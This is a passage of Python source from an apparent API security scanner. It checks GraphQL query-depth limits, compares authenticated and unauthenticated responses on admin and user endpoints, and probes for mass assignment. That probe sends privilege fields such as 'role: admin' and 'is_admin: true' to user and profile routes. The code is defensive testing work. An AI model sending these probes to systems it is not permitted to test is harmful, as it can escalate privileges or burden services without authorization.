            r = session.post(url, data=GRAPHQL_INTROSPECTION_BODY,
                             headers={"Content-Type": "application/json"},
                             timeout=REQUEST_TIMEOUT)
            if r.status_code != 200:
                continue
        except requests.RequestException:
            continue

        max_depth_allowed = None
        for depth, payload in DEPTH_PAYLOADS:
            try:
                r = session.post(url, data=payload,
                                 headers={"Content-Type": "application/json"},
                                 timeout=REQUEST_TIMEOUT)
                if r.status_code == 200 and "error" not in r.text.lower():
                    max_depth_allowed = depth
                else:
                    if max_depth_allowed is None:
                        max_depth_allowed = depth - 1
                    break
            except requests.RequestException:
                break

        rows.append({"endpoint": path, "max_depth_observed": max_depth_allowed})

        if max_depth_allowed is not None and max_depth_allowed >= 5:
            findings.append(Finding(
                "GraphQL Depth", f"No query depth limit enforced at {path}", "medium",
                f"The server accepted queries nested to depth {max_depth_allowed} without "
                "erroring, suggesting no depth limit is enforced. Attackers can craft deeply "
                "nested queries to cause DoS via resource exhaustion.",
                "Enforce a maximum query depth (typically 5-7) and reject queries that exceed it.",
                confidence="Confirmed",
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"))

    return {"endpoints_tested": len(rows), "rows": rows}, findings


def check_auth_comparison(base_url, session, auth_cookie=None):
    """APIT-02: Authenticated vs unauthenticated comparison on auth-sounding
    API paths.

    When `auth_cookie` is provided (a raw session-cookie string like
    ``session=abc123``), the check makes both an *authenticated* GET
    (with the cookie) and an *unauthenticated* GET (bare session) for
    each candidate path, then compares the two responses.  An endpoint
    that returns real API data to an unauthenticated caller while also
    accepting the authenticated cookie is a genuine auth-bypass signal.
    Confidence is only "Confirmed" when the unauthenticated leg gets a
    200 AND the authenticated leg returns a *different* (typically
    richer) response — distinguishing "the endpoint ignores auth
    entirely" from "the endpoint is intentionally public".

    When `auth_cookie` is ``None`` (the base-scan pipeline has no
    credentials), the check falls back to an honest unauthenticated-
    only probe: does a path whose *name* implies it should require
    auth return real API data?  Always confidence="Potential" in this
    mode — a public settings/config endpoint can be intentional.

    False-positive guards preserved from the review session:
    - _looks_like_api_response prevents SPA catch-all HTML from being
      counted as an API hit (same guard check_api_wordlist relies on).
    - A bogus-id baseline is NOT used here (the paths are fixed, not
      id-parameterized); instead the auth-vs-unauth diff itself serves
      as the corroboration when auth_cookie is provided."""
    findings = []
    rows = []

    API_PATHS = [
        "/api/v1/users", "/api/users", "/api/v1/admin", "/api/admin",
        "/api/v1/me", "/api/me", "/api/v1/profile", "/api/profile",
        "/api/v1/settings", "/api/settings", "/api/v1/config",
    ]

    auth_headers = {"Cookie": auth_cookie} if auth_cookie else None

    for path in API_PATHS:
        url = base_url + path

        # Unauthenticated leg (always)
        try:
            r_unauth = session.get(url, timeout=REQUEST_TIMEOUT, allow_redirects=False)
        except requests.RequestException:
            continue

        row = {"endpoint": path, "unauth_status": r_unauth.status_code,
               "unauth_size": len(r_unauth.content)}

        if auth_headers:
            # Authenticated leg (only when credentials are available)
            try:
                r_auth = session.get(url, headers=auth_headers,
                                     timeout=REQUEST_TIMEOUT, allow_redirects=False)
            except requests.RequestException:
                r_auth = None

            row["auth_status"] = r_auth.status_code if r_auth else None
            row["auth_size"] = len(r_auth.content) if r_auth else None
        else:
            r_auth = None
            row["auth_status"] = None
            row["auth_size"] = None

        rows.append(row)

        if auth_headers and r_auth is not None:
            # --- Credentialed mode: compare authenticated vs unauthenticated ---
            unauth_is_api = r_unauth.status_code == 200 and _looks_like_api_response(r_unauth)
            auth_is_api = r_auth.status_code == 200 and _looks_like_api_response(r_auth)

            if unauth_is_api:
                # The unauthenticated leg got real API data.
                # Check whether the authenticated leg got something
                # *different* — if so, the endpoint is returning data
                # to both, but the authenticated response is richer
                # (the caller's own data), which is the expected
                # pattern for a legit public endpoint.  If the
                # responses are the same, the endpoint ignores auth
                # entirely — that's the bypass.
                auth_differs = (r_auth.status_code != r_unauth.status_code
                                or abs(len(r_auth.content) - len(r_unauth.content)) > 32)

                if auth_differs and not auth_is_api:
                    # The two legs differ, but the *authenticated* one did
                    # not come back as a successful API response - so the
                    # supplied credentials are most likely expired, wrong,
                    # or scoped away from this path. The comparison is
                    # therefore not evidence about the endpoint's intent,
                    # and concluding "probably an intentional public
                    # endpoint" from it would be wrong. Report the
                    # unauthenticated exposure (which is real and was
                    # observed) and say plainly that the credentialed leg
                    # was unusable.
                    findings.append(Finding(
                        "Auth Bypass",
                        f"API endpoint {path} returns data without authentication "
                        "(credentialed comparison inconclusive)",
                        "medium",
                        f"GET {path} returned HTTP {r_unauth.status_code} with an API-shaped body "
                        f"to an unauthenticated caller. The authenticated request returned HTTP "
                        f"{r_auth.status_code} and did not look like a successful API response, so "
                        "the supplied credentials appear not to be working for this path - the "
                        "authenticated-vs-unauthenticated comparison could not be completed. The "
                        "unauthenticated exposure above was still directly observed.",
                        "Re-run with valid credentials for this path to complete the comparison; "
                        "meanwhile confirm the unauthenticated response exposes nothing sensitive.",
                        confidence="Potential",
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"))
                elif auth_differs:
                    # Both legs returned successful API data and they
                    # differ - the expected shape of a genuinely public
                    # endpoint that also serves a richer authenticated
                    # view. Still Potential: a human has to confirm the
                    # unauthenticated half isn't sensitive.
                    findings.append(Finding(
                        "Auth Bypass",
                        f"API endpoint {path} returns data without authentication (unconfirmed)",
                        "medium",
                        f"GET {path} returned HTTP {r_unauth.status_code} with an API-shaped body "
                        "to an unauthenticated caller. The authenticated response also succeeded "
                        "and differs, suggesting the endpoint may be intentionally public with an "
                        "authenticated view — needs human review to confirm the unauthenticated "
                        "data isn't sensitive.",
                        "Confirm this endpoint is meant to be public; otherwise require authentication.",
                        confidence="Potential",
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"))
                else:
                    # Identical responses for both — the endpoint ignores
                    # the auth cookie entirely.  Confirmed bypass.
                    findings.append(Finding(
                        "Auth Bypass",
                        f"API endpoint {path} ignores authentication entirely",
                        "high",
                        f"GET {path} returned identical API-shaped responses ({r_unauth.status_code}, "
                        f"{len(r_unauth.content)} bytes) both with and without the session cookie — "
                        "the endpoint does not enforce authentication at all.",
                        "Require authentication for this endpoint; implement proper authz checks.",
                        confidence="Confirmed",
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N"))
        else:
            # --- Unauthenticated-only mode (no credentials available) ---
            if r_unauth.status_code == 200 and _looks_like_api_response(r_unauth):
                findings.append(Finding(
                    "Auth Bypass",
                    f"API endpoint {path} returns data with no authentication",
                    "medium",
                    f"GET {path} returned HTTP 200 with an API-shaped body (JSON/XML) and zero "
                    "credentials. This may be an intentionally public endpoint or a missing "
                    "auth check - not confirmed as exploitable either way without human review.",
                    "Confirm this endpoint is meant to be public; otherwise require authentication.",
                    confidence="Potential",
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"))

    return {"endpoints_tested": len(rows), "rows": rows}, findings


def check_mass_assignment(base_url, session, auth_cookie=None):
    """APIT-03: Detect mass assignment by sending extra fields to API endpoints.

    When `auth_cookie` is provided, POSTs are sent with the authenticated
    session cookie — most APIs that accept POST to resource endpoints
    require authentication, so an unauthenticated POST would just get a
    401/403 and tell us nothing about mass assignment.

    When `auth_cookie` is ``None``, falls back to unauthenticated POSTs
    (which will only produce findings if the endpoint doesn't require
    auth — a narrower signal, but still useful).

    Two fixes from review (preserved):
    1. Dropped /register-style endpoints from the probe list — a
       fabricated POST to a real account-creation route can create a
       junk account on the live target (non-destructive-design
       violation).
    2. The original scan for e.g. "role" as a raw substring matched
       ordinary HTML ``role="button"`` ARIA markup — now requires an
       exact JSON key/value round-trip against the submitted payload."""
    findings = []
    rows = []

    EXTRA_FIELDS = {
        "role": "admin",
        "is_admin": True,
        "admin": True,
        "privilege": "superuser",
    }

    API_PATHS = ["/api/v1/users", "/api/users", "/api/v1/profile", "/api/profile"]

    auth_headers = {"Cookie": auth_cookie} if auth_cookie else {}

    for path in API_PATHS:
        url = base_url + path
        try:
            payload = {**EXTRA_FIELDS, "username": "test_probe_user_31415"}
            post_headers = {"Content-Type": "application/json", **auth_headers}
            r = session.post(url, json=payload,
                             headers=post_headers,
                             timeout=REQUEST_TIMEOUT, allow_redirects=False)
        except requests.RequestException:
            continue

        row = {"endpoint": path, "status": r.status_code, "accepted_fields": []}
        try:
            resp_json = r.json()
        except ValueError:
            resp_json = None

        if isinstance(resp_json, dict):
            for field, sent_value in EXTRA_FIELDS.items():
                if field in resp_json and resp_json[field] == sent_value:
                    row["accepted_fields"].append(field)

        rows.append(row)

        if row["accepted_fields"]:
            findings.append(Finding(
                "Mass Assignment", f"API endpoint {path} accepted privileged fields", "high",
                f"POST {path} echoed back the exact submitted value for: "
                f"{', '.join(row['accepted_fields'])}. The server appears to bind request "
                "data directly onto a model without an allow-list.",
                "Use allow-lists for accepted fields; never bind request data directly to models.",
                confidence="Confirmed",
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N"))

    return {"endpoints_tested": len(rows), "rows": rows}, findings
